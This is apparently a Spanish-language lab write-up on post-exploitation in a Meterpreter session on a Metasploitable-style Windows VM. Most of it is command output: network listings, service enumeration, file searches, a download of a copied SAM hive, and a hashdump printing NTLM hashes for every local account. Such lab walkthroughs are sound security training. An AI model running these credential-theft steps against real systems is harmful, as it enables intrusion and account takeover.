        tcp    127.0.0.1:49236  127.0.0.1:49235  ESTABLISHED  0     0      3488/tomcat8.exe
        tcp    127.0.0.1:49237  127.0.0.1:49238  ESTABLISHED  0     0      3488/tomcat8.exe
        tcp    127.0.0.1:49238  127.0.0.1:49237  ESTABLISHED  0     0      3488/tomcat8.exe
        tcp    127.0.0.1:49239  127.0.0.1:49240  ESTABLISHED  0     0      3488/tomcat8.exe
        tcp    127.0.0.1:49240  127.0.0.1:49239  ESTABLISHED  0     0      3488/tomcat8.exe
        tcp    127.0.0.1:49241  127.0.0.1:49242  ESTABLISHED  0     0      3488/tomcat8.exe
        tcp    127.0.0.1:49242  127.0.0.1:49241  ESTABLISHED  0     0      3488/tomcat8.exe
        tcp    127.0.0.1:49243  127.0.0.1:49244  ESTABLISHED  0     0      3488/tomcat8.exe
        tcp    127.0.0.1:49244  127.0.0.1:49243  ESTABLISHED  0     0      3488/tomcat8.exe
        tcp    127.0.0.1:49245  127.0.0.1:49246  ESTABLISHED  0     0      3488/tomcat8.exe
        tcp    127.0.0.1:49246  127.0.0.1:49245  ESTABLISHED  0     0      3488/tomcat8.exe
        tcp    127.0.0.1:49247  127.0.0.1:49248  ESTABLISHED  0     0      1076/java.exe
        tcp    127.0.0.1:49248  127.0.0.1:49247  ESTABLISHED  0     0      1076/java.exe
        tcp    127.0.0.1:49249  127.0.0.1:49250  ESTABLISHED  0     0      3488/tomcat8.exe
        tcp    127.0.0.1:49250  127.0.0.1:49249  ESTABLISHED  0     0      3488/tomcat8.exe
        tcp    127.0.0.1:49251  127.0.0.1:49252  ESTABLISHED  0     0      3488/tomcat8.exe
        tcp    127.0.0.1:49252  127.0.0.1:49251  ESTABLISHED  0     0      3488/tomcat8.exe
        tcp    127.0.0.1:49253  127.0.0.1:49254  ESTABLISHED  0     0      3488/tomcat8.exe
        tcp    127.0.0.1:49254  127.0.0.1:49253  ESTABLISHED  0     0      3488/tomcat8.exe
        tcp    127.0.0.1:49255  127.0.0.1:49256  ESTABLISHED  0     0      3488/tomcat8.exe
        tcp    127.0.0.1:49256  127.0.0.1:49255  ESTABLISHED  0     0      3488/tomcat8.exe
        tcp    127.0.0.1:49265  127.0.0.1:8028   ESTABLISHED  0     0      1432/java.exe
        tcp    127.0.0.1:49288  127.0.0.1:49289  ESTABLISHED  0     0      1432/java.exe
        tcp    127.0.0.1:49289  127.0.0.1:49288  ESTABLISHED  0     0      1432/java.exe
        tcp    127.0.0.1:49295  127.0.0.1:49296  ESTABLISHED  0     0      1432/java.exe
        tcp    127.0.0.1:49296  127.0.0.1:49295  ESTABLISHED  0     0      1432/java.exe
        tcp    127.0.0.1:51829  127.0.0.1:8020   TIME_WAIT    0     0      0/[System Process]
        tcp    127.0.0.1:51830  127.0.0.1:8020   TIME_WAIT    0     0      0/[System Process]
        tcp    127.0.0.1:51831  127.0.0.1:8020   TIME_WAIT    0     0      0/[System Process]
        tcp    127.0.0.1:51832  127.0.0.1:8020   TIME_WAIT    0     0      0/[System Process]
        tcp    127.0.0.1:51833  127.0.0.1:8020   TIME_WAIT    0     0      0/[System Process]
        tcp    127.0.0.1:51834  127.0.0.1:8020   TIME_WAIT    0     0      0/[System Process]
        tcp    127.0.0.1:51835  127.0.0.1:8020   TIME_WAIT    0     0      0/[System Process]
        tcp    127.0.0.1:51836  127.0.0.1:8020   TIME_WAIT    0     0      0/[System Process]
        tcp    127.0.0.1:51837  127.0.0.1:8020   TIME_WAIT    0     0      0/[System Process]
        tcp    127.0.0.1:51838  127.0.0.1:8020   TIME_WAIT    0     0      0/[System Process]
        tcp    127.0.0.1:51839  127.0.0.1:8020   TIME_WAIT    0     0      0/[System Process]
        tcp    127.0.0.1:51840  127.0.0.1:8020   TIME_WAIT    0     0      0/[System Process]
        tcp    127.0.0.1:51841  127.0.0.1:8020   TIME_WAIT    0     0      0/[System Process]
        tcp    127.0.0.1:51842  127.0.0.1:8020   TIME_WAIT    0     0      0/[System Process]
        tcp    127.0.0.1:51843  127.0.0.1:8020   TIME_WAIT    0     0      0/[System Process]
        tcp    127.0.0.1:51844  127.0.0.1:8020   TIME_WAIT    0     0      0/[System Process]
        tcp    127.0.0.1:51845  127.0.0.1:8020   TIME_WAIT    0     0      0/[System Process]
        tcp    127.0.0.1:51846  127.0.0.1:8020   TIME_WAIT    0     0      0/[System Process]
        tcp    127.0.0.1:51847  127.0.0.1:8020   TIME_WAIT    0     0      0/[System Process]
        tcp    127.0.0.1:51848  127.0.0.1:8020   TIME_WAIT    0     0      0/[System Process]
        tcp    127.0.0.1:51849  127.0.0.1:8020   TIME_WAIT    0     0      0/[System Process]
        tcp    127.0.0.1:51850  127.0.0.1:8020   TIME_WAIT    0     0      0/[System Process]
        tcp    127.0.0.1:51851  127.0.0.1:8020   TIME_WAIT    0     0      0/[System Process]
        tcp    127.0.0.1:51852  127.0.0.1:8020   TIME_WAIT    0     0      0/[System Process]
        tcp6   :::22            :::*             LISTEN       0     0      3820/sshd.exe
        tcp6   :::135           :::*             LISTEN       0     0      744/svchost.exe
        tcp6   :::445           :::*             LISTEN       0     0      4/System
        tcp6   :::1617          :::*             LISTEN       0     0      2292/java.exe
        tcp6   :::3389          :::*             LISTEN       0     0      4712/svchost.exe
        tcp6   :::3700          :::*             LISTEN       0     0      1076/java.exe
        tcp6   :::4848          :::*             LISTEN       0     0      1076/java.exe
        tcp6   :::5985          :::*             LISTEN       0     0      4/System
        tcp6   :::7676          :::*             LISTEN       0     0      1076/java.exe
        tcp6   :::8019          :::*             LISTEN       0     0      1432/java.exe
        tcp6   :::8020          :::*             LISTEN       0     0      1992/dcserverhttpd.exe
        tcp6   :::8028          :::*             LISTEN       0     0      2432/postgres.exe
        tcp6   :::8031          :::*             LISTEN       0     0      1432/java.exe
        tcp6   :::8032          :::*             LISTEN       0     0      1432/java.exe
        tcp6   :::8080          :::*             LISTEN       0     0      1076/java.exe
        tcp6   :::8181          :::*             LISTEN       0     0      1076/java.exe
        tcp6   :::8383          :::*             LISTEN       0     0      1992/dcserverhttpd.exe
        tcp6   :::8443          :::*             LISTEN       0     0      1432/java.exe
        tcp6   :::8444          :::*             LISTEN       0     0      1432/java.exe
        tcp6   :::8484          :::*             LISTEN       0     0      3388/java.exe
        tcp6   :::8585          :::*             LISTEN       0     0      3604/httpd.exe
        tcp6   :::8686          :::*             LISTEN       0     0      1076/java.exe
        tcp6   :::9200          :::*             LISTEN       0     0      1412/elasticsearch-service-x
        tcp6   :::9300          :::*             LISTEN       0     0      1412/elasticsearch-service-x
        tcp6   :::47001         :::*             LISTEN       0     0      4/System
        tcp6   :::49152         :::*             LISTEN       0     0      408/wininit.exe
        tcp6   :::49153         :::*             LISTEN       0     0      824/svchost.exe
        tcp6   :::49154         :::*             LISTEN       0     0      884/svchost.exe
        tcp6   :::49155         :::*             LISTEN       0     0      512/lsass.exe
        tcp6   :::49170         :::*             LISTEN       0     0      1432/java.exe
        tcp6   :::49192         :::*             LISTEN       0     0      2292/java.exe
        tcp6   :::49193         :::*             LISTEN       0     0      2292/java.exe
        tcp6   :::49219         :::*             LISTEN       0     0      3388/java.exe
        tcp6   :::49220         :::*             LISTEN       0     0      3388/java.exe
        tcp6   :::49260         :::*             LISTEN       0     0      504/services.exe
        tcp6   :::49266         :::*             LISTEN       0     0      4560/svchost.exe
        udp    0.0.0.0:500      0.0.0.0:*                     0     0      884/svchost.exe
        udp    0.0.0.0:4500     0.0.0.0:*                     0     0      884/svchost.exe
        udp    0.0.0.0:5353     0.0.0.0:*                     0     0      3388/java.exe
        udp    0.0.0.0:5355     0.0.0.0:*                     0     0      1012/svchost.exe
        udp    0.0.0.0:33848    0.0.0.0:*                     0     0      3388/java.exe
        udp    0.0.0.0:54328    0.0.0.0:*                     0     0      1412/elasticsearch-service-x
        udp    10.0.2.15:137    0.0.0.0:*                     0     0      4/System
        udp    10.0.2.15:138    0.0.0.0:*                     0     0      4/System
        udp    127.0.0.1:52777  0.0.0.0:*                     0     0      2432/postgres.exe
        udp6   :::500           :::*                          0     0      884/svchost.exe
        udp6   :::4500          :::*                          0     0      884/svchost.exe
        udp6   :::5353          :::*                          0     0      3388/java.exe
        udp6   :::5355          :::*                          0     0      1012/svchost.exe
        udp6   :::33848         :::*                          0     0      3388/java.exe
        udp6   :::54328         :::*                          0     0      1412/elasticsearch-service-x


***Tabla de enrutamiento.***

    meterpreter > route            

![F1.10](/assets/KILL3/F1.10.png)

**Navegación en el sistema de archivos**

Vista del directorio actual.
Listado de archivos.

    1. meterpreter > pwd              
    2. meterpreter > ls               

Solo se observa una parte del listado de archivos.

![F1.11](/assets/KILL3/F1.11.png)

Navegación al directorio de usuarios.
Busca de archivos .txt en Users.

    3. meterpreter > cd C:\\Users     
    4. meterpreter > search -f *.txt -d C:\\Users    

![F1.12](/assets/KILL3/F1.12.png)
![F1.13](/assets/KILL3/F1.13.png)

Descarga del archivo al atacante.

    5. meterpreter > download C:\\Windows\\Temp\\SAM .  

![F1.14](/assets/KILL3/F1.14.png)

**Enumerar servicios**

Se abre el **cmd.exe** en el target.
Se enlistan los servicios en ejecución.

    1. meterpreter > shell            
    2. C:\> net start                

Resultado:
![F1.15](/assets/KILL3/F1.15.png)
![F1.16](/assets/KILL3/F1.16.png)

Se visualiza el estado detallado de todos los servicios.

    3. C:\> sc query type= all      

Resultado: Al contar con vario servicios, los resultados siguientes solo representan la parte inicial y la parte final.

![F1.17](/assets/KILL3/F1.17.png)
![F1.18](/assets/KILL3/F1.18.png)

Conexiones con PID asociados. Y para volver a Meterpreter ingresar **"exit"**.

    INPUT:
    C:\> netstat -ano              
    C:\> exit                      

Resultado:

    OUTPUT:
    C:\Users>netstat -ano
    -----------------------
    netstat -ano
    
    Active Connections

    Proto  Local Address          Foreign Address        State           PID
    TCP    0.0.0.0:22             0.0.0.0:0              LISTENING       3820
    TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       744
    TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
    TCP    0.0.0.0:1617           0.0.0.0:0              LISTENING       2292
    TCP    0.0.0.0:3000           0.0.0.0:0              LISTENING       2284
    TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       3828
    TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       4712
    TCP    0.0.0.0:3700           0.0.0.0:0              LISTENING       1076
    TCP    0.0.0.0:4848           0.0.0.0:0              LISTENING       1076
    TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
    TCP    0.0.0.0:7676           0.0.0.0:0              LISTENING       1076
    TCP    0.0.0.0:8009           0.0.0.0:0              LISTENING       3488
    TCP    0.0.0.0:8019           0.0.0.0:0              LISTENING       1432
    TCP    0.0.0.0:8020           0.0.0.0:0              LISTENING       1992
    TCP    0.0.0.0:8022           0.0.0.0:0              LISTENING       1432
    TCP    0.0.0.0:8027           0.0.0.0:0              LISTENING       1904
    TCP    0.0.0.0:8028           0.0.0.0:0              LISTENING       2432
    TCP    0.0.0.0:8031           0.0.0.0:0              LISTENING       1432
    TCP    0.0.0.0:8032           0.0.0.0:0              LISTENING       1432
    TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING       1076
    TCP    0.0.0.0:8181           0.0.0.0:0              LISTENING       1076
    TCP    0.0.0.0:8282           0.0.0.0:0              LISTENING       3488
    TCP    0.0.0.0:8383           0.0.0.0:0              LISTENING       1992
    TCP    0.0.0.0:8443           0.0.0.0:0              LISTENING       1432
    TCP    0.0.0.0:8444           0.0.0.0:0              LISTENING       1432
    TCP    0.0.0.0:8484           0.0.0.0:0              LISTENING       3388
    TCP    0.0.0.0:8585           0.0.0.0:0              LISTENING       3604
    TCP    0.0.0.0:8686           0.0.0.0:0              LISTENING       1076
    TCP    0.0.0.0:9200           0.0.0.0:0              LISTENING       1412
    TCP    0.0.0.0:9300           0.0.0.0:0              LISTENING       1412
    TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
    TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       408
    TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       824
    TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       884
    TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       512
    TCP    0.0.0.0:49170          0.0.0.0:0              LISTENING       1432
    TCP    0.0.0.0:49192          0.0.0.0:0              LISTENING       2292
    TCP    0.0.0.0:49193          0.0.0.0:0              LISTENING       2292
    TCP    0.0.0.0:49219          0.0.0.0:0              LISTENING       3388
    TCP    0.0.0.0:49220          0.0.0.0:0              LISTENING       3388
    TCP    0.0.0.0:49260          0.0.0.0:0              LISTENING       504
    TCP    0.0.0.0:49266          0.0.0.0:0              LISTENING       4560
    TCP    10.0.2.15:139          0.0.0.0:0              LISTENING       4
    TCP    10.0.2.15:9300         10.0.2.15:49171        ESTABLISHED     1412
    TCP    10.0.2.15:9300         10.0.2.15:49172        ESTABLISHED     1412
    TCP    10.0.2.15:9300         10.0.2.15:49173        ESTABLISHED     1412
    TCP    10.0.2.15:9300         10.0.2.15:49174        ESTABLISHED     1412
    TCP    10.0.2.15:9300         10.0.2.15:49175        ESTABLISHED     1412
    TCP    10.0.2.15:9300         10.0.2.15:49176        ESTABLISHED     1412
    TCP    10.0.2.15:9300         10.0.2.15:49177        ESTABLISHED     1412
    TCP    10.0.2.15:9300         10.0.2.15:49178        ESTABLISHED     1412
    TCP    10.0.2.15:9300         10.0.2.15:49179        ESTABLISHED     1412
    TCP    10.0.2.15:9300         10.0.2.15:49180        ESTABLISHED     1412
    TCP    10.0.2.15:9300         10.0.2.15:49181        ESTABLISHED     1412
    TCP    10.0.2.15:9300         10.0.2.15:49182        ESTABLISHED     1412
    TCP    10.0.2.15:9300         10.0.2.15:49183        ESTABLISHED     1412
    TCP    10.0.2.15:49171        10.0.2.15:9300         ESTABLISHED     1412
    TCP    10.0.2.15:49172        10.0.2.15:9300         ESTABLISHED     1412
    TCP    10.0.2.15:49173        10.0.2.15:9300         ESTABLISHED     1412
    TCP    10.0.2.15:49174        10.0.2.15:9300         ESTABLISHED     1412
    TCP    10.0.2.15:49175        10.0.2.15:9300         ESTABLISHED     1412
    TCP    10.0.2.15:49176        10.0.2.15:9300         ESTABLISHED     1412
    TCP    10.0.2.15:49177        10.0.2.15:9300         ESTABLISHED     1412
    TCP    10.0.2.15:49178        10.0.2.15:9300         ESTABLISHED     1412
    TCP    10.0.2.15:49179        10.0.2.15:9300         ESTABLISHED     1412
    TCP    10.0.2.15:49180        10.0.2.15:9300         ESTABLISHED     1412
    TCP    10.0.2.15:49181        10.0.2.15:9300         ESTABLISHED     1412
    TCP    10.0.2.15:49182        10.0.2.15:9300         ESTABLISHED     1412
    TCP    10.0.2.15:49183        10.0.2.15:9300         ESTABLISHED     1412
    TCP    10.0.2.15:52127        10.0.2.3:4444          ESTABLISHED     1152
    TCP    127.0.0.1:8005         0.0.0.0:0              LISTENING       3488
    TCP    127.0.0.1:8028         127.0.0.1:49265        ESTABLISHED     2432
    TCP    127.0.0.1:31000        127.0.0.1:32000        ESTABLISHED     1432
    TCP    127.0.0.1:32000        0.0.0.0:0              LISTENING       1188
    TCP    127.0.0.1:32000        127.0.0.1:31000        ESTABLISHED     1188
    TCP    127.0.0.1:49157        127.0.0.1:49158        ESTABLISHED     1412
    TCP    127.0.0.1:49158        127.0.0.1:49157        ESTABLISHED     1412
    TCP    127.0.0.1:49159        127.0.0.1:49160        ESTABLISHED     1412
    TCP    127.0.0.1:49160        127.0.0.1:49159        ESTABLISHED     1412
    TCP    127.0.0.1:49161        127.0.0.1:49162        ESTABLISHED     1412
    TCP    127.0.0.1:49162        127.0.0.1:49161        ESTABLISHED     1412
    TCP    127.0.0.1:49164        127.0.0.1:49165        ESTABLISHED     1412
    TCP    127.0.0.1:49165        127.0.0.1:49164        ESTABLISHED     1412
    TCP    127.0.0.1:49166        127.0.0.1:49167        ESTABLISHED     1412
    TCP    127.0.0.1:49167        127.0.0.1:49166        ESTABLISHED     1412
    TCP    127.0.0.1:49168        127.0.0.1:49169        ESTABLISHED     1412
    TCP    127.0.0.1:49169        127.0.0.1:49168        ESTABLISHED     1412
    TCP    127.0.0.1:49184        127.0.0.1:49185        ESTABLISHED     1412
    TCP    127.0.0.1:49185        127.0.0.1:49184        ESTABLISHED     1412
    TCP    127.0.0.1:49186        127.0.0.1:49187        ESTABLISHED     1412
    TCP    127.0.0.1:49187        127.0.0.1:49186        ESTABLISHED     1412
    TCP    127.0.0.1:49188        127.0.0.1:49189        ESTABLISHED     1412
    TCP    127.0.0.1:49189        127.0.0.1:49188        ESTABLISHED     1412
    TCP    127.0.0.1:49197        127.0.0.1:49198        ESTABLISHED     3388
    TCP    127.0.0.1:49198        127.0.0.1:49197        ESTABLISHED     3388
    TCP    127.0.0.1:49202        127.0.0.1:49203        ESTABLISHED     1076
    TCP    127.0.0.1:49203        127.0.0.1:49202        ESTABLISHED     1076
    TCP    127.0.0.1:49205        127.0.0.1:49206        ESTABLISHED     1076
    TCP    127.0.0.1:49206        127.0.0.1:49205        ESTABLISHED     1076
    TCP    127.0.0.1:49207        127.0.0.1:49208        ESTABLISHED     1076
    TCP    127.0.0.1:49208        127.0.0.1:49207        ESTABLISHED     1076
    TCP    127.0.0.1:49209        127.0.0.1:49210        ESTABLISHED     1076
    TCP    127.0.0.1:49210        127.0.0.1:49209        ESTABLISHED     1076
    TCP    127.0.0.1:49213        127.0.0.1:49214        ESTABLISHED     3388
    TCP    127.0.0.1:49214        127.0.0.1:49213        ESTABLISHED     3388
    TCP    127.0.0.1:49215        127.0.0.1:49216        ESTABLISHED     3388
    TCP    127.0.0.1:49216        127.0.0.1:49215        ESTABLISHED     3388
    TCP    127.0.0.1:49217        127.0.0.1:49218        ESTABLISHED     3388
    TCP    127.0.0.1:49218        127.0.0.1:49217        ESTABLISHED     3388
    TCP    127.0.0.1:49221        127.0.0.1:49222        ESTABLISHED     3488
    TCP    127.0.0.1:49222        127.0.0.1:49221        ESTABLISHED     3488
    TCP    127.0.0.1:49223        127.0.0.1:49224        ESTABLISHED     3488
    TCP    127.0.0.1:49224        127.0.0.1:49223        ESTABLISHED     3488
    TCP    127.0.0.1:49225        127.0.0.1:49226        ESTABLISHED     3488
    TCP    127.0.0.1:49226        127.0.0.1:49225        ESTABLISHED     3488
    TCP    127.0.0.1:49227        127.0.0.1:49228        ESTABLISHED     3488
    TCP    127.0.0.1:49228        127.0.0.1:49227        ESTABLISHED     3488
    TCP    127.0.0.1:49229        127.0.0.1:49230        ESTABLISHED     3488
    TCP    127.0.0.1:49230        127.0.0.1:49229        ESTABLISHED     3488
    TCP    127.0.0.1:49231        127.0.0.1:49232        ESTABLISHED     3488
    TCP    127.0.0.1:49232        127.0.0.1:49231        ESTABLISHED     3488
    TCP    127.0.0.1:49233        127.0.0.1:49234        ESTABLISHED     3488
    TCP    127.0.0.1:49234        127.0.0.1:49233        ESTABLISHED     3488
    TCP    127.0.0.1:49235        127.0.0.1:49236        ESTABLISHED     3488
    TCP    127.0.0.1:49236        127.0.0.1:49235        ESTABLISHED     3488
    TCP    127.0.0.1:49237        127.0.0.1:49238        ESTABLISHED     3488
    TCP    127.0.0.1:49238        127.0.0.1:49237        ESTABLISHED     3488
    TCP    127.0.0.1:49239        127.0.0.1:49240        ESTABLISHED     3488
    TCP    127.0.0.1:49240        127.0.0.1:49239        ESTABLISHED     3488
    TCP    127.0.0.1:49241        127.0.0.1:49242        ESTABLISHED     3488
    TCP    127.0.0.1:49242        127.0.0.1:49241        ESTABLISHED     3488
    TCP    127.0.0.1:49243        127.0.0.1:49244        ESTABLISHED     3488
    TCP    127.0.0.1:49244        127.0.0.1:49243        ESTABLISHED     3488
    TCP    127.0.0.1:49245        127.0.0.1:49246        ESTABLISHED     3488
    TCP    127.0.0.1:49246        127.0.0.1:49245        ESTABLISHED     3488
    TCP    127.0.0.1:49247        127.0.0.1:49248        ESTABLISHED     1076
    TCP    127.0.0.1:49248        127.0.0.1:49247        ESTABLISHED     1076
    TCP    127.0.0.1:49249        127.0.0.1:49250        ESTABLISHED     3488
    TCP    127.0.0.1:49250        127.0.0.1:49249        ESTABLISHED     3488
    TCP    127.0.0.1:49251        127.0.0.1:49252        ESTABLISHED     3488
    TCP    127.0.0.1:49252        127.0.0.1:49251        ESTABLISHED     3488
    TCP    127.0.0.1:49253        127.0.0.1:49254        ESTABLISHED     3488
    TCP    127.0.0.1:49254        127.0.0.1:49253        ESTABLISHED     3488
    TCP    127.0.0.1:49255        127.0.0.1:49256        ESTABLISHED     3488
    TCP    127.0.0.1:49256        127.0.0.1:49255        ESTABLISHED     3488
    TCP    127.0.0.1:49265        127.0.0.1:8028         ESTABLISHED     1432
    TCP    127.0.0.1:49288        127.0.0.1:49289        ESTABLISHED     1432
    TCP    127.0.0.1:49289        127.0.0.1:49288        ESTABLISHED     1432
    TCP    127.0.0.1:49295        127.0.0.1:49296        ESTABLISHED     1432
    TCP    127.0.0.1:49296        127.0.0.1:49295        ESTABLISHED     1432
    TCP    127.0.0.1:52715        127.0.0.1:8020         TIME_WAIT       0
    TCP    127.0.0.1:52716        127.0.0.1:8020         TIME_WAIT       0
    TCP    127.0.0.1:52717        127.0.0.1:8020         TIME_WAIT       0
    TCP    127.0.0.1:52718        127.0.0.1:8020         TIME_WAIT       0
    TCP    127.0.0.1:52719        127.0.0.1:8020         TIME_WAIT       0
    TCP    127.0.0.1:52720        127.0.0.1:8020         TIME_WAIT       0
    TCP    127.0.0.1:52721        127.0.0.1:8020         TIME_WAIT       0
    TCP    127.0.0.1:52722        127.0.0.1:8020         TIME_WAIT       0
    TCP    127.0.0.1:52723        127.0.0.1:8020         TIME_WAIT       0
    TCP    127.0.0.1:52724        127.0.0.1:8020         TIME_WAIT       0
    TCP    127.0.0.1:52725        127.0.0.1:8020         TIME_WAIT       0
    TCP    127.0.0.1:52726        127.0.0.1:8020         TIME_WAIT       0
    TCP    127.0.0.1:52727        127.0.0.1:8020         TIME_WAIT       0
    TCP    127.0.0.1:52728        127.0.0.1:8020         TIME_WAIT       0
    TCP    127.0.0.1:52729        127.0.0.1:8020         TIME_WAIT       0
    TCP    127.0.0.1:52730        127.0.0.1:8020         TIME_WAIT       0
    TCP    127.0.0.1:52731        127.0.0.1:8020         TIME_WAIT       0
    TCP    127.0.0.1:52732        127.0.0.1:8020         TIME_WAIT       0
    TCP    127.0.0.1:52733        127.0.0.1:8020         TIME_WAIT       0
    TCP    127.0.0.1:52734        127.0.0.1:8020         TIME_WAIT       0
    TCP    127.0.0.1:52735        127.0.0.1:8020         TIME_WAIT       0
    TCP    127.0.0.1:52736        127.0.0.1:8020         TIME_WAIT       0
    TCP    127.0.0.1:52737        127.0.0.1:8020         TIME_WAIT       0
    TCP    127.0.0.1:52738        127.0.0.1:8020         TIME_WAIT       0
    TCP    [::]:22                [::]:0                 LISTENING       3820
    TCP    [::]:135               [::]:0                 LISTENING       744
    TCP    [::]:445               [::]:0                 LISTENING       4
    TCP    [::]:1617              [::]:0                 LISTENING       2292
    TCP    [::]:3389              [::]:0                 LISTENING       4712
    TCP    [::]:3700              [::]:0                 LISTENING       1076
    TCP    [::]:4848              [::]:0                 LISTENING       1076
    TCP    [::]:5985              [::]:0                 LISTENING       4
    TCP    [::]:7676              [::]:0                 LISTENING       1076
    TCP    [::]:8019              [::]:0                 LISTENING       1432
    TCP    [::]:8020              [::]:0                 LISTENING       1992
    TCP    [::]:8028              [::]:0                 LISTENING       2432
    TCP    [::]:8031              [::]:0                 LISTENING       1432
    TCP    [::]:8032              [::]:0                 LISTENING       1432
    TCP    [::]:8080              [::]:0                 LISTENING       1076
    TCP    [::]:8181              [::]:0                 LISTENING       1076
    TCP    [::]:8383              [::]:0                 LISTENING       1992
    TCP    [::]:8443              [::]:0                 LISTENING       1432
    TCP    [::]:8444              [::]:0                 LISTENING       1432
    TCP    [::]:8484              [::]:0                 LISTENING       3388
    TCP    [::]:8585              [::]:0                 LISTENING       3604
    TCP    [::]:8686              [::]:0                 LISTENING       1076
    TCP    [::]:9200              [::]:0                 LISTENING       1412
    TCP    [::]:9300              [::]:0                 LISTENING       1412
    TCP    [::]:47001             [::]:0                 LISTENING       4
    TCP    [::]:49152             [::]:0                 LISTENING       408
    TCP    [::]:49153             [::]:0                 LISTENING       824
    TCP    [::]:49154             [::]:0                 LISTENING       884
    TCP    [::]:49155             [::]:0                 LISTENING       512
    TCP    [::]:49170             [::]:0                 LISTENING       1432
    TCP    [::]:49192             [::]:0                 LISTENING       2292
    TCP    [::]:49193             [::]:0                 LISTENING       2292
    TCP    [::]:49219             [::]:0                 LISTENING       3388
    TCP    [::]:49220             [::]:0                 LISTENING       3388
    TCP    [::]:49260             [::]:0                 LISTENING       504
    TCP    [::]:49266             [::]:0                 LISTENING       4560
    UDP    0.0.0.0:500            *:*                                    884
    UDP    0.0.0.0:4500           *:*                                    884
    UDP    0.0.0.0:5353           *:*                                    3388
    UDP    0.0.0.0:5355           *:*                                    1012
    UDP    0.0.0.0:33848          *:*                                    3388
    UDP    0.0.0.0:54328          *:*                                    1412
    UDP    10.0.2.15:137          *:*                                    4
    UDP    10.0.2.15:138          *:*                                    4
    UDP    127.0.0.1:52777        *:*                                    2432
    UDP    [::]:500               *:*                                    884
    UDP    [::]:4500              *:*                                    884
    UDP    [::]:5353              *:*                                    3388
    UDP    [::]:5355              *:*                                    1012
    UDP    [::]:33848             *:*                                    3388
    UDP    [::]:54328             *:*                                    1412

    C:\Users>exit
    exit
    meterpreter >

***Extracción de las credenciales **(requiere NT AUTHORITY\SYSTEM)**.***

INPUT:

    meterpreter > hashdump

OUTPUT esperado:

    Administrator:500:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
    anakin_skywalker:1011:aad3b435b51404eeaad3b435b51404ee:c706f83a7b17a0230e55cde2f3de94fa:::
    artoo_detoo:1007:aad3b435b51404eeaad3b435b51404ee:fac6aada8b7afc418b3afea63b7577b4:::
    ben_kenobi:1009:aad3b435b51404eeaad3b435b51404ee:4fb77d816bce7aeee80d7c2e5e55c859:::
    boba_fett:1014:aad3b435b51404eeaad3b435b51404ee:d60f9a4859da4feadaf160e97d200dc9:::
    chewbacca:1017:aad3b435b51404eeaad3b435b51404ee:e7200536327ee731c7fe136af4575ed8:::
    c_three_pio:1008:aad3b435b51404eeaad3b435b51404ee:0fd2eb40c4aa690171ba066c037397ee:::
    darth_vader:1010:aad3b435b51404eeaad3b435b51404ee:b73a851f8ecff7acafbaa4a806aea3e0:::
    greedo:1016:aad3b435b51404eeaad3b435b51404ee:ce269c6b7d9e2f1522b44686b49082db:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    han_solo:1006:aad3b435b51404eeaad3b435b51404ee:33ed98c5969d05a7c15c25c99e3ef951:::
    jabba_hutt:1015:aad3b435b51404eeaad3b435b51404ee:93ec4eaa63d63565f37fe7f28d99ce76:::
    jarjar_binks:1012:aad3b435b51404eeaad3b435b51404ee:ec1dcd52077e75aef4a1930b0917c4d4:::
    kylo_ren:1018:aad3b435b51404eeaad3b435b51404ee:74c0a3dd06613d3240331e94ae18b001:::
    lando_calrissian:1013:aad3b435b51404eeaad3b435b51404ee:62708455898f2d7db11cfb670042a53f:::
    leia_organa:1004:aad3b435b51404eeaad3b435b51404ee:8ae6a810ce203621cf9cfa6f21f14028:::
    luke_skywalker:1005:aad3b435b51404eeaad3b435b51404ee:481e6150bde6998ed22b0e9bac82005a:::
    sshd:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    sshd_server:1002:aad3b435b51404eeaad3b435b51404ee:8d0a16cfc061c3359db455d00ec27035:::
    vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::

Los hashes NT resultantes son los mismos que extrajimos en el Kill Chain 1 vía VSS + samdump2 — pero aquí los obtenemos directamente desde Meterpreter en segundos, sin necesidad de copiar archivos SAM/SYSTEM manualmente. hashdump usa la misma técnica internamente: lee el hive SAM a través de una copia en memoria del kernel.

